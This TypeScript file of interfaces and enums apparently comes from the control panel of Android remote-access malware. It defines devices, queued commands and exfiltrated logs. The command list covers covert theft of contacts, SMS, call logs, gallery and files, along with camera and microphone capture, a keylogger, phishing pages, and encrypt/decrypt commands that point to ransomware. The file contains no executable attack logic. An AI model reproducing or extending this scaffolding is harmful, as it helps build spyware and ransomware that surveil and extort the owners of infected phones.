// Device model and interfaces

export interface Device {
  id: string;
  socket_id: string;
  device_id: string;
  model: string;
  version: string;
  ip: string;
  user_agent?: string;
  last_seen_at?: string;
  owner_user_id?: string;
  created_at: string;
  updated_at: string;
  isOnline?: boolean;
}

export enum CommandType {
  CONTACTS = 'contacts',
  SMS = 'sms',
  CALLS = 'calls',
  GALLERY = 'gallery',
  MAIN_CAMERA = 'main-camera',
  SELFIE_CAMERA = 'selfie-camera',
  MICROPHONE = 'microphone',
  SCREENSHOT = 'screenshot',
  TOAST = 'toast',
  VIBRATE = 'vibrate',
  PLAY_AUDIO = 'play-audio',
  STOP_AUDIO = 'stop-audio',
  CLIPBOARD = 'clipboard',
  SEND_SMS = 'sendSms',
  KEYLOGGER_ON = 'keylogger-on',
  KEYLOGGER_OFF = 'keylogger-off',
  OPEN_URL = 'open-url',
  PHISHING = 'phishing',
  ENCRYPT = 'encrypt',
  DECRYPT = 'decrypt',
  APPS = 'apps',
  FILE_EXPLORER = 'file-explorer',
  ALL_SMS = 'all-sms',
  POP_NOTIFICATION = 'popNotification'
}

export enum CommandStatus {
  PENDING = 'pending',
  SENT = 'sent',
  OK = 'ok',
  ERROR = 'error',
  TIMEOUT = 'timeout'
}

export interface Command {
  id: string;
  device_id: string;
  command: CommandType | string;
  params: Record<string, any>;
  status: CommandStatus;
  response?: any;
  error_message?: string;
  created_by: string;
  created_at: string;
  updated_at: string;
  executed_at?: string;
}

export interface SendCommandRequest {
  command: CommandType | string;
  params?: Record<string, any>;
}

export interface SendCommandResponse {
  message: string;
  commandId: string;
  status: CommandStatus;
}

export enum LogType {
  CONTACTS = 'contacts',
  SMS = 'sms',
  CALLS = 'calls',
  LOCATION = 'location',
  CLIPBOARD = 'clipboard',
  SCREENSHOT = 'screenshot',
  CAMERA = 'camera',
  AUDIO = 'audio',
  GALLERY = 'gallery',
  KEYLOGGER = 'keylogger',
  APPS = 'apps',
  FILE = 'file',
  MESSAGE = 'message',
  OTHER = 'other'
}

export interface DeviceLog {
  id: string;
  device_id: string;
  type: LogType;
  payload: any;
  file_path?: string;
  created_at: string;
}

